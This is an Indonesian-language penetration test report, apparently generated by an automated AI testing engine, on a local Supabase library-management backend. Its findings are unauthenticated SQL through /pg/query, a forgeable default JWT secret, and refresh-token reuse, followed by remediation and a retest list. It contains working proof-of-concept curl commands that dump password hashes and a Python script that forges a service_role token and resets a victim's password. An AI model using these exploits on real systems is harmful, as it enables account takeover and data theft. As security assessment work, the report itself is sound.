# Laporan Uji Penetrasi Keamanan (Security Penetration Test Report)
**Aplikasi Manajemen Perpustakaan (Azelib Backend)**

---

## 📌 Informasi Dokumen

| Parameter | Keterangan |
|---|---|
| **Tanggal Pengujian** | 26 Agustus 2026 |
| **Target Penetrasi** | `http://127.0.0.1:15421` (Supabase Backend: Kong Gateway, PostgREST, GoTrue, PostgreSQL) |
| **Metodologi** | OWASP Web Security Testing Guide (WSTG) & PTES (*Gray-Box Dynamic Assessment*) |
| **Alat / Engine** | Strix Autonomous Multi-Agent Penetration Testing Engine (DeepSeek LLM) |
| **Postur Risiko Keseluruhan** | 🔴 **CRITICAL** (Terdapat 2 Kerentanan Kritis pada Konfigurasi Gateway & Rahasia Default) |

---

## 1. Ringkasan Eksekutif (Executive Summary)

Pengujian penetrasi keamanan eksternal terhadap platform backend Supabase lokal (`http://host.docker.internal:15421`) menemukan **dua kerentanan tingkat KRITIS (Critical)** dan **satu kerentanan tingkat MENENGAH (Medium)**. 

Kombinasi dari kerentanan kritis ini memungkinkan **pengambilalihan penuh atas database, seluruh data tenant, dan seluruh akun pengguna tanpa memerlukan autentikasi apa pun**.

### Ringkasan Temuan Utama:
1. **Eksekusi Arbitrary SQL Tanpa Autentikasi (`vuln-0001` - Critical, CVSS 9.8):**
   Layanan manajemen internal `@supabase/postgres-meta` terekspos secara publik pada Kong gateway di path `/pg/*` tanpa autentikasi. Endpoint `POST /pg/query` mengeksekusi perintah SQL apa pun sebagai role `postgres` (`can_bypass_rls=true`), memberikan akses baca/tulis/hapus penuh ke seluruh tabel, membocorkan hash password bcrypt akun di `auth.users`, serta mem-bypass total seluruh aturan Row Level Security (RLS).
2. **Kunci Penandatangan JWT Default / Tertebak (`vuln-0002` - Critical, CVSS 9.8):**
   Instalasi menggunakan `JWT_SECRET` default bawaan template. Penyerang dapat memalsukan token `service_role` secara mandiri, mendaftar seluruh pengguna, mereset password akun mana pun (termasuk Admin/Owner) melalui endpoint admin GoTrue, dan login sebagai pengguna tersebut (*Full Account Takeover*).
3. **Rotasi Refresh Token Tanpa Deteksi Pemakaian Ulang (`vuln-0003` - Medium, CVSS 6.5):**
   GoTrue merotasi refresh token saat digunakan, namun tidak membatalkan masa berlaku token sebelumnya dan tidak mendeteksi pemakaian ulang (*no reuse detection*). Refresh token lama yang bocor dapat digunakan kembali berulang kali untuk mencetak access token baru.

### Dampak Bisnis (Business Impact):
* **Kebocoran Data Total (Total Data Disclosure):** Seluruh data PII, email, hash password, dan data koleksi/peminjaman seluruh perpustakaan (tenant) dapat diunduh penyerang.
* **Pengambilalihan Akun (Account Takeover):** Akun Admin dan Owner dapat diambil alih secara instan.
* **Kerusakan Integritas & Ketersediaan Data:** Penyerang dapat menghapus data, memodifikasi riwayat denda/buku, serta membuat atau menghapus tabel.
* **Runtuhnya Isolasi Multi-Tenant:** RLS tidak berlaku ketika penyerang mengakses jalur `/pg/*` atau memalsukan token `service_role`.

---

## 2. Matriks Temuan Kerentanan

| ID | Judul Kerentanan | Severity | CVSS v3.1 | CWE | Endpoint Terdampak |
|---|---|:---:|:---:|:---:|---|
| **vuln-0001** | Eksekusi Arbitrary SQL Tanpa Autentikasi via API `postgres-meta` | **CRITICAL** | **9.8** | CWE-306 | `POST /pg/query`, `POST /pg/tables` |
| **vuln-0002** | Default JWT Secret Memungkinkan Pemalsuan `service_role` & Account Takeover | **CRITICAL** | **9.8** | CWE-798 | `/auth/v1/admin/users`, `/rest/v1/*` |
| **vuln-0003** | Rotasi Refresh Token Tidak Menginvalidasi Token Lama (*No Reuse Detection*) | **MEDIUM** | **6.5** | CWE-613 | `POST /auth/v1/token` |

---

## 3. Metodologi Pengujian

Pengujian dilakukan menggunakan pendekatan *gray-box dynamic penetration testing* melalui 5 track agen spesialis independen:

1. **Reconnaissance & Surface Mapping:** Memetakan seluruh sub-origin Supabase (REST, Auth/GoTrue, Storage, postgres-meta, RPC), skema OpenAPI, tabel database (11 tabel), fungsi RPC, dan konfigurasi otentikasi publik.
2. **Unauthenticated Access Testing:** Menguji apakah ada endpoint data atau fungsi administratif yang dapat diakses tanpa token/kunci.
3. **Multi-Tenant Isolation & BOLA/IDOR Testing:** Mendaftarkan beberapa akun pengguna independen dan menguji apakah data antar-tenant dapat dibaca/diubah secara horizontal lewat REST API atau manipulasi tabel `tenant_member`.
4. **SQL Injection Testing:** Melakukan injeksi error-based, boolean-based, dan time-based (`pg_sleep`) pada seluruh parameter PostgREST (`select`, `filter`, `order`, `columns`) serta fungsi RPC `get_user_tenants()`.
5. **Auth & Business Logic Testing:** Menguji kelemahan alur pendaftaran, manipulasi metadata/role (*mass assignment*), endpoint administratif, validasi penandatanganan JWT, dan siklus hidup sesi token.

---

## 4. Analisis Teknis Mendalam & Bukti Eksploitasi (PoC)

---

### 🔴 Temuan 1: `vuln-0001` — Eksekusi Arbitrary SQL Tanpa Autentikasi via Rute `/pg/*`

* **Severity:** CRITICAL (CVSS 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
* **Kelemahan:** CWE-306 (*Missing Authentication for Critical Function*)
* **Endpoint:** `POST /pg/query`, `POST /pg/tables`, `GET /pg/*`

#### Analisis:
Kong gateway meneruskan permintaan rute `/pg/*` langsung ke layanan internal `@supabase/postgres-meta` tanpa mewajibkan header `apikey` maupun `Authorization: Bearer <token>`. 

Endpoint `POST /pg/query` menerima body JSON `{"query": "<perintah-sql>"}` dan langsung mengeksekusinya ke database PostgreSQL dengan user `postgres`. Role `postgres` memiliki atribut `can_bypass_rls=true`, `rolcreaterole=true`, dan `rolcreatedb=true`.

#### Pembuktian (Proof of Concept):
1. **Membaca Data Seluruh Pengguna & Hash Password:**
   ```bash
   curl -X POST http://127.0.0.1:15421/pg/query \
     -H "Content-Type: application/json" \
     -d '{"query": "SELECT id, email, encrypted_password FROM auth.users;"}'
   ```
   *Hasil:* Mengembalikan daftar seluruh akun terdaftar beserta hash bcrypt password.

2. **Membuat Tabel Baru & Mengubah Skema:**
   ```bash
   curl -X POST http://127.0.0.1:15421/pg/tables \
     -H "Content-Type: application/json" \
     -d '{"name": "tabel_penyerang", "schema": "public"}'
   ```
   *Hasil:* Tabel baru berhasil dibuat di database tanpa izin admin.

3. **Injeksi Data Lintas Tenant:**
   Penyerang dapat melakukan `INSERT`, `UPDATE`, atau `DELETE` pada tabel `tenant`, `anggota`, `buku`, dan `peminjaman` milik tenant mana pun.

---

### 🔴 Temuan 2: `vuln-0002` — Default JWT Secret Memungkinkan Pemalsuan Token `service_role` & Account Takeover

* **Severity:** CRITICAL (CVSS 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
* **Kelemahan:** CWE-798 (*Use of Hard-coded Credentials*)
* **Endpoint:** `/auth/v1/admin/users`, `/auth/v1/admin/users/{id}`, `/rest/v1/*`

#### Analisis:
Sistem Supabase lokal menggunakan kunci rahasia standar:
`super-secret-jwt-token-with-at-least-32-characters-long`

Karena kunci ini bersifat publik dan baku, siapa pun dapat menandatangani token JWT HS256 secara offline dengan klaim `role: "service_role"`.
* GoTrue mempercayai token ini dan membuka seluruh API manajemen di `/auth/v1/admin/*`.
* Penyerang dapat mereset password akun admin/owner perpustakaan secara langsung tanpa verifikasi email, lalu login ke aplikasi menggunakan password baru.
* PostgREST menerima token tersebut dan mengeksekusi query sebagai role database `service_role` yang mem-bypass seluruh RLS.

#### Skrip Eksploitasi Bukti (PoC Python):
```python
import base64, hmac, hashlib, json, time, requests

BASE_URL = "http://127.0.0.1:15421"
DEFAULT_SECRET = "super-secret-jwt-token-with-at-least-32-characters-long"

def b64_url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_service_role_token():
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "iss": f"{BASE_URL}/auth/v1",
        "role": "service_role",
        "sub": "00000000-0000-0000-0000-000000000000",
        "aud": "authenticated",
        "exp": int(time.time()) + 3600
    }
    encoded_header = b64_url(json.dumps(header).encode())
    encoded_payload = b64_url(json.dumps(payload).encode())
    signature = hmac.new(
        DEFAULT_SECRET.encode(),
        f"{encoded_header}.{encoded_payload}".encode(),
        hashlib.sha256
    ).digest()
    return f"{encoded_header}.{encoded_payload}.{b64_url(signature)}"

token = forge_service_role_token()
headers = {"apikey": "anon", "Authorization": f"Bearer {token}"}

# 1. Mengambil daftar seluruh user
users_resp = requests.get(f"{BASE_URL}/auth/v1/admin/users", headers=headers)
print("Status Daftar User:", users_resp.status_code) # 200 OK

# 2. Reset password akun korban secara paksa
target_user_id = users_resp.json()["users"][0]["id"]
reset_resp = requests.put(
    f"{BASE_URL}/auth/v1/admin/users/{target_user_id}",
    headers={**headers, "Content-Type": "application/json"},
    json={"password": "PasswordBaruPenyerang123!"}
)
print("Status Reset Password:", reset_resp.status_code) # 200 OK
```

---

### 🟡 Temuan 3: `vuln-0003` — Rotasi Refresh Token Tidak Menginvalidasi Token Sebelumnya

* **Severity:** MEDIUM (CVSS 6.5 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`)
* **Kelemahan:** CWE-613 (*Insufficient Session Expiration*)
* **Endpoint:** `POST /auth/v1/token?grant_type=refresh_token`

#### Analisis:
Ketika klien melakukan refresh token melalui endpoint GoTrue, token baru diterbitkan. Namun, token lama (`rt0`) tetap berstatus valid di server dan tidak otomatis dibatalkan. Penggunaan ulang token lama (*token replay*) menghasilkan access token baru tanpa memicu mekanisme pemutusan sesi (*reuse detection*). 

Jika refresh token perangkat pengguna sempat terekspos (misal dari cache lokal yang tidak terenkripsi atau penyadapan jaringan), penyerang dapat mempertahankan akses sesi pengguna selamanya.

---

## 5. Evaluasi Kontrol Keamanan yang Terbukti Aman (Clean Negatives)

Selain menemukan 3 kerentanan di atas, pengujian membuktikan bahwa **arsitektur database dan skema aplikasi memiliki pertahanan yang sangat kokoh terhadap serangan umum lainnya:**

| Area Pengujian | Hasil | Detail Validasi |
|---|:---:|---|
| **SQL Injection (SQLi)** | 🟢 **Aman** | Seluruh pengujian SQLi berbasis *time-delay* (`pg_sleep(3)`), manipulasi parameter query PostgREST (`select`, `filter`, `order`), dan logical operator (`eq.`, `or()`, `and()`) 100% gagal dan ditolak secara aman oleh PostgREST parser. |
| **BOLA / IDOR via REST** | 🟢 **Aman** | Permintaan baca/tulis langsung via REST API anonim ditolak dengan `HTTP 401 (42501 permission denied)`. Isolasi data per `tenant_id` terjaga melalui join ke fungsi `get_user_tenants()`. |
| **RPC Function Abuse** | 🟢 **Aman** | Fungsi `get_user_tenants()` dikonfigurasi dengan `SECURITY DEFINER` dan `SET search_path = public, pg_temp`, tidak menerima argumen eksternal yang dapat dimanipulasi, dan mengembalikan array kosong `[]` jika dipanggil tanpa sesi valid. |
| **Mass Assignment** | 🟢 **Aman** | Parameter pendaftaran akun baru membersihkan input `app_metadata` secara otomatis; penyerang tidak dapat menaikkan hak akses menjadi admin saat mendaftar (*signup claim injection* diblokir). |
| **Storage Isolation** | 🟢 **Aman** | Endpoint `/storage/v1/` mewajibkan token JWT terverifikasi (`HTTP 403 Invalid Compact JWS` untuk request tanpa token). |

---

## 6. Panduan Tindakan Perbaikan (Remediation & Hardening Guide)

---

### Langkah Mendesak (Immediate Action — Wajib Sebelum Rilis Publik)

#### 1. Blokir / Hapus Rute `/pg/*` dari Akses Publik Gateway
* **Akar Masalah:** Rute manajemen internal `postgres-meta` terbuka ke publik di Kong Gateway.
* **Solusi:** Di lingkungan produksi atau reverse proxy publik (Nginx/Kong/Cloudflare), hapus rute `/pg/*` atau buat aturan blokir (*Deny all methods on `/pg/*`*) sehingga mengembalikan kode `403 Forbidden` atau `404 Not Found`. Layanan `postgres-meta` hanya boleh diakses secara internal untuk kebutuhan Supabase Studio lokal.

#### 2. Buat & Terapkan `JWT_SECRET` Acak dengan Entropi Tinggi
* **Akar Masalah:** Menggunakan kunci default bawaan template.
* **Solusi:** 
  1. Generate kunci acak minimal 64 karakter (contoh via terminal):
     ```bash
     openssl rand -base64 48
     ```
  2. Perbarui nilai `JWT_SECRET` pada seluruh konfigurasi environment Supabase (`GoTrue`, `PostgREST`, `Kong`, `Storage`, `Realtime`).
  3. Generate ulang pasangan kunci `anon_key` dan `service_role_key` yang baru berdasarkan secret tersebut.
  4. Simpan secret di file `.env` yang terisolasi dan jangan pernah dimasukkan ke dalam version control (Git).

#### 3. Audit Akun Pasca Pengujian
* Periksa tabel `auth.users` untuk memastikan tidak ada akun asing atau modifikasi password yang tidak dikenali sebelum aplikasi digunakan secara nyata.

---

### Langkah Jangka Pendek (Short-Term Hardening)

#### 4. Aktifkan Refresh Token Reuse Detection
* Di konfigurasi GoTrue (parameter `GOTRUE_SECURITY_REFRESH_TOKEN_REUSE_INTERVAL`), aktifkan fitur deteksi pemakaian ulang token. Dengan fitur ini, apabila ada upaya penukaran menggunakan refresh token lama yang sudah pernah dirotasi, seluruh sesi akun terkait akan otomatis dibatalkan (*revoked*).

#### 5. Sembunyikan OpenAPI Spec Publik
* Batasi atau nonaktifkan endpoint dokumentasi OpenAPI PostgREST pada root `/rest/v1/` untuk pengguna publik anonim guna meminimalkan pengungkapan struktur skema database (*information disclosure*).

---

## 7. Prosedur Verifikasi Ulang (Retest Checklist)

Setelah langkah perbaikan diterapkan, lakukan pengujian ulang dengan checklist berikut:

- [ ] Kirim request `POST /pg/query` tanpa header autentikasi $\rightarrow$ Pastikan server mengembalikan **`403 Forbidden`** atau **`404 Not Found`**.
- [ ] Kirim request ke `/auth/v1/admin/users` menggunakan token yang ditandatangani dengan rahasia default lama $\rightarrow$ Pastikan server mengembalikan **`401 Unauthorized (PGRST301)`**.
- [ ] Lakukan rotasi refresh token, lalu kirim kembali token lama $\rightarrow$ Pastikan server menolak permintaan dan membatalkan sesi aktif.

---

*Laporan ini dihasilkan secara otomatis dari hasil uji penetrasi Strix Engine dan diverifikasi terhadap standar keamanan aplikasi modern.*
